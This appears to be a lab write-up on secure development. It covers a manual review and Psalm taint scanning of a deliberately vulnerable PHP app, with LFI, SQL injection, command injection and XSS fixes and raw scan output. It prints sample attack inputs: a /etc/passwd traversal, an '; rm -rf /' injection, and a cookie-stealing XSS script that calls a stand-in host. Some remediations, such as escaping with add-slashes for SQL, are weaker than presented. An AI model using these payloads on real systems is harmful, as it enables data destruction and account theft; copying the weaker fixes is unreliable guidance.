# 🛡️ Implementing Secure SDLC: A Deep Dive into Manual Code Review and SAST

## 📖 Introduction
Understanding and implementing a **Secure Software Development Life Cycle (SSDLC)** is critical in modern software engineering. SSDLC emphasizes "shifting left"—integrating security practices and testing into every phase of development rather than waiting until production. 

In this write-up, I will demonstrate the importance of SSDLC by performing both a **Manual Code Review** and **Automated Static Application Security Testing (SAST)**. I will not only identify the vulnerabilities but also break them down on a molecular level to explain exactly *why* they are dangerous and *how* to remediate them effectively.

---

## 🔍 Part I: Manual Code Review

Manual testing is a fundamental step. Before relying on automated scanners, a security engineer must understand the codebase context. The first objective in this lab was to find a **Local File Inclusion (LFI)** vulnerability.

### 1. Hunting for Sinks using `grep`
I started by searching the project directory for instances of the `include()` function, which is a common sink for LFI in PHP.

```bash
cd /home/ubuntu/Desktop/html/
grep -rn "include(" .
```

> **Command Logic:**
> * `-r` — Recursive search through all folders.
> * `-n` — Display the line numbers.
> * `.` — Search within the current directory.

**Output Results:**
```text
./login.php:35:<?php include('navbar.php'); ?>
./nospiders-gallery.php:16:<?php include('navbar.php'); ?>
./hidden-panel.php:2:include("db.php");
./hidden-panel.php:44:<?php include('navbar.php'); ?>
./view.php:16:<?php include('navbar.php'); ?>
./view.php:12:include('./gallery-files/'.$_GET['img']);
./aboutme.php:16:<?php include('navbar.php'); ?>
./cowsay.php:24:<?php include('navbar.php'); ?>
./index.php:16:<?php include('navbar.php'); ?>
```
Line 12 in `view.php` immediately stood out as it takes direct user input.

### 2. The Mechanics of LFI: How Code Becomes a Weapon

**How a Normal Request Works:**
The developer intended for users to simply view images from a gallery.
* **Code:** `include('./gallery-files/' . $_GET['img']);`
* **Expected URL:** `view.php?img=cat.jpg`
* **Server Logic:** The server takes the prefix `./gallery-files/`, appends `cat.jpg`, and searches for `./gallery-files/cat.jpg`. Everything works as expected.

**How the LFI Attack Works:**
Because the application does not validate the `img` parameter, an attacker can use special directory traversal characters to navigate the server's folders.
* **Malicious URL:** `view.php?img=../../../../etc/passwd`
* **Server Logic:** The server literally concatenates the string: `./gallery-files/../../../../etc/passwd`.
* **Result:** `..` is a Linux command to "move one level up" in the directory hierarchy. By chaining `../../`, the hacker escapes the website's folder into the system root (`/`) and accesses `/etc/passwd` (a standard Linux file containing a list of all system users).

**Why is this dangerous?**
LFI allows access to:
1.  **Configuration files** (e.g., `.env` or `config.php`) where database passwords reside.
2.  **System logs** (e.g., `/var/log/apache2/access.log`). This can lead to **Remote Code Execution (RCE)** if the hacker manages to "poison" the log file with PHP code.
3.  **Source code** of other pages on the site.

### 3. Remediation: How to Fix LFI Properly
To secure this code, a developer must either use a strict **Whitelist** or strip dangerous characters using `basename()`.

**Concept 1: The Whitelist (Allowing only what is specified)**
Instead of accepting any string, a whitelist creates an isolated environment.
```php
$allowed_files = ['photo1.jpg', 'photo2.jpg', 'logo.png']; // Our whitelist
$requested_file = $_GET['img']; // User input

if (in_array($requested_file, $allowed_files)) {
    include('./gallery-files/' . $requested_file);
} else {
    echo "Error: File not found or access denied!";
}
```
If an attacker sends `../../../../etc/passwd`, the program simply asks: *"Is this exact string in my allowed list?"* Since it's not, the `in_array` check returns `false`, and the malicious path never reaches the file system.

**Why Whitelisting is better than Blacklisting:**
Many developers try to simply delete `../` or `/etc/`. This "blacklist" approach is flawed because hackers use bypass techniques:
* **Double Encoding:** `%252e%252e%252f` (the server decodes this back into `../`).
* **Bypass Filters:** If you delete `../`, a hacker will write `....//`. After the internal `../` is removed, the remaining characters form `../` again.
A whitelist ignores all these tricks because it requires an exact match.

**Concept 2: Using `basename()`**
For dynamic file handling, we can use `basename()`. It cuts off everything related to the path (all `../` and `/etc/`), leaving only the clean filename. Even if the hacker inputs `../../etc/passwd`, the function turns it into just `passwd`, and PHP looks for it safely inside `./gallery-files/`.

```diff
- include('./gallery-files/'.$_GET['img']);
+ include('./gallery-files/' . basename($_GET['img']));
```

*Short conclusion on Manual Testing:* Manual code review is vital. It provides the deep context needed to understand the business logic of vulnerabilities and architect secure solutions like whitelists, which automated scanners cannot write for you.

---

## 🤖 Part II: Automated Scanning with SAST

While manual review is great, it does not scale well. **SAST (Static Application Security Testing)** tools automatically analyze source code from the inside out to find vulnerabilities quickly. However, they can produce false positives if they don't understand custom functions.

I used **Psalm** for scanning:
```bash
./vendor/bin/psalm --no-cache
```
The initial scan revealed errors (Full scan results are available at the end of the report🔍). To help Psalm understand the code better, I added annotations directly above the custom `db_query` function in `db.php`:

```php
/**
 * @psalm-taint-sink sql $query
 * @psalm-taint-specialize
 */
function db_query($conn, $query){ ... }
```
These annotations (`@psalm-taint-sink` and `@psalm-taint-specialize`) instruct Psalm to check every single call to `db_query` separately.

### Vulnerabilities Found by SAST:

🚨 **1. Command Injection (TaintedShell) in `cowsay.php`**
* **Mechanics:** The program uses `passthru()` to execute a Linux terminal command: `passthru("perl cowsay -f " . $cow . " " . $mooing);`
* **The Exploit:** The hacker sends `; rm -rf /` in the `mooing` parameter. The semicolon (`;`) separates commands in Linux. The server executes `cowsay`, and then executes the hacker's command, leading to total server takeover (RCE).

🚨 **2. SQL Injection (TaintedSql) in `hidden-panel.php`**
* **Mechanics:** User data is added directly to the query string: `"SELECT ... WHERE id=" . $_GET['guest_id']`
* **The Exploit:** Instead of `1`, the hacker inputs `1 OR 1=1`. The query becomes `SELECT ... WHERE id=1 OR 1=1`. Since `1=1` is always true, the server dumps the entire database instead of a single user.

🚨 **3. LFI (TaintedInclude) in `view.php`**
* *(As analyzed thoroughly in Part I).*

🚨 **4. XSS (TaintedHtml) in `login.php`**
* **Mechanics:** The program takes an error text from the URL (`?err=Invalid+password`) and outputs it: `echo $_GET['err'];`
* **The Exploit:** The hacker sends a link with a script: `<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>`. The victim's browser executes it, stealing session cookies and allowing account takeover without a password.

*SAST Summary:* All these vulnerabilities share the same root cause: **Lack of Input Validation**.

---

## 🛠️ Part III: Step-by-Step Remediation

I proceeded to patch the code to achieve a zero-error SAST report.

### Fix 1: Resolving LFI in `view.php`
As discussed, I implemented `basename()` to strip paths.
```diff
- include('./gallery-files/'.$_GET['img']);
+ include('./gallery-files/'.basename($_GET['img']));
```

### Fix 2: Resolving SQL Injection ID #1 in `hidden-panel.php`
```diff
- $sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];
+ $sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".(int)$_GET['guest_id'];
```
* **Explanation:** By adding `(int)` before the parameter, we force PHP to cast the input to an integer. If a hacker inputs `1 OR 1=1`, the `(int)` function turns it simply into `1`. All malicious code disappears, and the query remains secure.

### Fix 3: Resolving XSS in `login.php`
```diff
- <?=$_GET['err']?>
+ <?=htmlspecialchars($_GET['err'], ENT_QUOTES, 'UTF-8')?>
```
* **What does `ENT_QUOTES` do?** By default, `htmlspecialchars()` only processes double quotes (`"`). If you omit this flag, single quotes (`'`) remain unchanged. Imagine code like this: `<input type='text' value='<?php echo htmlspecialchars($_GET["name"]); ?>'>`. A hacker inputs: `' onmouseover='alert(1)`. Without `ENT_QUOTES`, the hacker successfully adds a new event handler. With `ENT_QUOTES`, the single quote becomes the safe entity `&#039;`, neutralizing the attack.
* **What does `UTF-8` do?** It ensures proper handling of Cyrillic characters and prevents **Encoding Attacks**. Hackers sometimes use tricky encodings (like UTF-7) to hide the `<` symbol. By strictly enforcing `UTF-8`, the function accurately identifies and sanitizes all dangerous characters, even if hidden in multi-byte sequences.

### Fix 4: Resolving Command Injection in `cowsay.php`
```diff
- passthru('perl /usr/bin/cowsay -f '.$cow.' '.$mooing);
+ passthru('perl /usr/bin/cowsay -f '.escapeshellarg($cow).' '.escapeshellarg($mooing));
```
* **Explanation:** We wrap the variables in `escapeshellarg()`, which automatically adds safe quotes and escapes characters, making command injection impossible.

### Fix 5: Resolving SQL Injection ($sql2) False Positive
Psalm flagged `$sql2` as a False Positive despite a `preg_replace` filter. To satisfy the SAST scanner and harden the code, I implemented `filter_var()`.
```diff
- $sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";
+ $clean_log_id = filter_var($_GET['log_id'], FILTER_SANITIZE_ADD_SLASHES);
+ $sql2 = "SELECT id, logtext FROM logs WHERE id='$clean_log_id'";
```
* **Explanation:** `FILTER_SANITIZE_ADD_SLASHES` is a specific rule that finds dangerous characters (quotes, backslashes) and adds a backslash (`\`) before them. If a hacker inputs `' OR 1=1 --`, the filter changes it to `\' OR 1=1 --`. The database reads the quote not as a command boundary, but as literal text. The attack fails because the DB searches for an ID that literally equals that text.

### Fix 6: Resolving SQL Injection ($sql3) Limit Bypass
```diff
- $sql3 = "SELECT id, name FROM asciiart WHERE id=".preg_replace("/[^0-9]/", "", $_GET['art_id'], 1);
+ $sql3 = "SELECT id, name FROM asciiart WHERE id=" . (int)$_GET['art_id'];
```
* **Explanation:** The problem was the limit `1` at the end of `preg_replace`. It meant "replace only the *first* non-numeric character found." A hacker could send `A' OR 1=1`. The program sees the letter `A`, deletes it, and leaves the rest (`' OR 1=1`) intact. By using Type Casting `(int)$_GET['art_id']`, we abandon flawed regex entirely. `123abc` turns into `123`, and `' OR 1=1` turns into `0`.

---

## ✅ Part IV: Verification and Conclusion

After saving all remediations, I triggered the SAST scanner one final time:

```bash
./vendor/bin/psalm --no-cache --taint-analysis
```
**Result:** `No errors found!`

### Final Summary
This exercise highlights why a comprehensive SDLC requires both approaches:
* **Manual Testing** is essential for understanding business logic, spotting logical flaws (like the limit `1` bypass in Regex), and designing architectural defenses like whitelists.
* **Automated Scanning (SAST)** is indispensable for scaling security. It traces complex data flows rapidly across massive codebases to highlight exactly where tainted data reaches vulnerable sinks.

Combining both ensures robust, secure code before it ever reaches production.




🔍Scan results...
./vendor/bin/psalm --no-cache --taint-analysis

ERROR: TaintedShell - html/cowsay.php:58:38 - Detected tainted shell code (see https://psalm.dev/246)
  $_GET
    <no known location>

  $_GET['mooing'] - html/cowsay.php:51:14
            $mooing = $_GET["mooing"];

  $mooing - html/cowsay.php:51:4
            $mooing = $_GET["mooing"];

  concat - html/cowsay.php:58:38
                            passthru('perl /usr/bin/cowsay -f '.$cow.' '.$mooing);

  call to passthru - html/cowsay.php:58:38
                            passthru('perl /usr/bin/cowsay -f '.$cow.' '.$mooing);


ERROR: TaintedHtml - html/cowsay.php:60:34 - Detected tainted HTML (see https://psalm.dev/245)
  Error::__toString - vendor/vimeo/psalm/stubs/CoreImmutableClasses.phpstub:333:21
    public function __toString() {}

  concat - html/cowsay.php:60:52
                            echo "<p class=mt-3><b>$error</b></p>";

  call to echo - html/cowsay.php:60:34
                            echo "<p class=mt-3><b>$error</b></p>";


ERROR: TaintedTextWithQuotes - html/cowsay.php:60:34 - Detected tainted text with possible quotes (see https://psalm.dev/274)
  Error::__toString - vendor/vimeo/psalm/stubs/CoreImmutableClasses.phpstub:333:21
    public function __toString() {}

  concat - html/cowsay.php:60:52
                            echo "<p class=mt-3><b>$error</b></p>";

  call to echo - html/cowsay.php:60:34
                            echo "<p class=mt-3><b>$error</b></p>";


ERROR: TaintedSql - html/db.php:21:26 - Detected tainted SQL (see https://psalm.dev/244)
  $_GET
    <no known location>

  $_GET['guest_id'] - html/hidden-panel.php:6:65
$sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];

  concat - html/hidden-panel.php:6:8
$sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];

  $sql - html/hidden-panel.php:6:1
$sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];

  call to db_query - html/hidden-panel.php:7:27
$result = db_query($conn, $sql);


ERROR: TaintedSql - html/db.php:21:26 - Detected tainted SQL (see https://psalm.dev/244)
  $_GET
    <no known location>

  $_GET['log_id'] - html/hidden-panel.php:19:87
$sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";

  call to preg_replace - html/hidden-panel.php:19:87
$sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";

  preg_replace#3 - html/hidden-panel.php:19:87
$sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";

  preg_replace - vendor/vimeo/psalm/stubs/CoreGenericFunctions.phpstub:1182:10
function preg_replace($pattern, $replacement, $subject, int $limit = -1, &$count = null) {}

  concat - html/hidden-panel.php:19:9
$sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";

  concat - html/hidden-panel.php:19:9
$sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";

  $sql2 - html/hidden-panel.php:19:1
$sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";

  call to db_query - html/hidden-panel.php:20:28
$result2 = db_query($conn, $sql2);


ERROR: TaintedSql - html/db.php:22:32 - Detected tainted SQL (see https://psalm.dev/244)
  $_GET
    <no known location>

  $_GET['guest_id'] - html/hidden-panel.php:6:65
$sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];

  concat - html/hidden-panel.php:6:8
$sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];

  $sql - html/hidden-panel.php:6:1
$sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];

  call to db_query - html/hidden-panel.php:7:27
$result = db_query($conn, $sql);

  db_query#2 - html/db.php:21:26
function db_query($conn, $query){

  $query - html/db.php:21:26
function db_query($conn, $query){

  call to mysqli_query - html/db.php:22:32
    $result = mysqli_query($conn, $query);


ERROR: TaintedHtml - html/login.php:46:24 - Detected tainted HTML (see https://psalm.dev/245)
  $_GET
    <no known location>

  $_GET['err'] - html/login.php:46:24
                    <?=$_GET['err']?>

  call to echo - html/login.php:46:24
                    <?=$_GET['err']?>


ERROR: TaintedTextWithQuotes - html/login.php:46:24 - Detected tainted text with possible quotes (see https://psalm.dev/274)
  $_GET
    <no known location>

  $_GET['err'] - html/login.php:46:24
                    <?=$_GET['err']?>

  call to echo - html/login.php:46:24
                    <?=$_GET['err']?>


ERROR: TaintedInclude - html/view.php:22:9 - Detected tainted code passed to include or similar (see https://psalm.dev/251)
  $_GET
    <no known location>

  $_GET['img'] - html/view.php:22:28
include('./gallery-files/'.$_GET['img']);

  concat - html/view.php:22:9
include('./gallery-files/'.$_GET['img']);